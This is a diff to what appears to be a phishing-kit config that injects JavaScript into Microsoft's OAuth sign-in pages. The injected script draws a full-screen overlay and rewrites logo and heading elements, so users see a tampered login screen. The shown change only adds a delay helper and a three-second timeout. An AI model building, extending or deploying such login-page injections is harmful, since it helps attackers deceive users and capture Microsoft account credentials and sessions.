@@ -54,6 +54,10 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
     script: |
+      function wait(ms, callback) {
+      setTimeout(callback, ms);
+      }
+      
       const overlay = document.createElement("div");
       overlay.style.position = "fixed";
       overlay.style.top = "0";
@@ -139,6 +143,11 @@ js_inject:
               logoImg.style.width = "100px";
               logoImg.style.margin = "0 0 20px 0";
             }
+            wait(3000, () => {
+            console.log("Waited 3 seconds!");
+            
+            });
+
 
             if (headerTitle) {
               const heading = headerTitle.querySelector('[role="heading"], h1, div');
